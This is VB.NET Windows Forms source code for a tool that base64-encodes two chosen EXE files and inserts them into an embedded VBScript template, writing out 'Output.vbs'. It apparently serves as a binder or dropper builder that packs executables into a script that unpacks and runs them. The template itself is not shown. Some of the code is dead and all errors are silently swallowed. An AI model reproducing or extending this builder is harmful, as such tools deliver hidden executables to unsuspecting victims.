Imports System.IO

Public Class Form1

    Private Sub CarbonFiberButton1_Click(sender As Object, e As EventArgs) Handles CarbonFiberButton1.Click
        End
    End Sub

    Private Sub CarbonFiberButton3_Click(sender As Object, e As EventArgs) Handles CarbonFiberButton3.Click
        Try
            Dim OpenFileDialog As New OpenFileDialog
            With OpenFileDialog
                .Title = "Select EXE File"
                .Filter = "Exe Files (*.exe)|*.exe"
                .ShowDialog()
            End With
            CarbonFiberTextBox1.Text = OpenFileDialog.FileName
            RichTextBox1.Text = ConvertFileToBase64(CarbonFiberTextBox1.Text)
        Catch ex As Exception
        End Try
    End Sub

    Private Sub CarbonFiberButton4_Click(sender As Object, e As EventArgs) Handles CarbonFiberButton4.Click
        Try
            Dim OpenFileDialog As New OpenFileDialog
            With OpenFileDialog
                .Title = "Select EXE File"
                .Filter = "Exe Files (*.exe)|*.exe"
                .ShowDialog()
            End With
            CarbonFiberTextBox2.Text = OpenFileDialog.FileName
            RichTextBox2.Text = ConvertFileToBase64(CarbonFiberTextBox2.Text)
        Catch ex As Exception
        End Try
    End Sub
    Public Function ConvertFileToBase64(ByVal fileName As String) As String
        Return Convert.ToBase64String(System.IO.File.ReadAllBytes(fileName))
    End Function

    Private Sub CarbonFiberButton2_Click(sender As Object, e As EventArgs) Handles CarbonFiberButton2.Click
        Try
            Dim dialog As New SaveFileDialog With {.FileName = "Output.vbs", .Filter = "|*.vbs"}
            If (dialog.ShowDialog = DialogResult.OK) Then
                Me.compile(Me.RichTextBox1.Text, Me.RichTextBox2.Text, dialog.FileName)
            End If
        Catch ex As Exception

        End Try
    End Sub
    Public Sub compile(ByVal Name As String, ByVal host As String, ByVal out As String)
        Dim contents As String = My.Resources.code.Replace("DDZZ", RichTextBox1.Text).Replace("ZZDD", RichTextBox2.Text)
        Dim dialog As New SaveFileDialog With {.FileName = "Output.vbs", .Filter = "|*.vbs"}
        File.WriteAllText(out, contents)
        contents = Strings.Replace(contents, ChrW(13) & ChrW(10), ChrW(13) & ChrW(10) & " ", 1, -1, CompareMethod.Binary)
        Application.DoEvents()
        Interaction.MsgBox(out, MsgBoxStyle.ApplicationModal, "Done!")
        Me.Close()
    End Sub

    Private Sub LinkLabel2_LinkClicked(sender As Object, e As LinkLabelLinkClickedEventArgs) Handles LinkLabel2.LinkClicked
        Process.Start("")
    End Sub

    Private Sub LinkLabel1_LinkClicked(sender As Object, e As LinkLabelLinkClickedEventArgs) Handles LinkLabel1.LinkClicked
        Process.Start("")
    End Sub
End Class
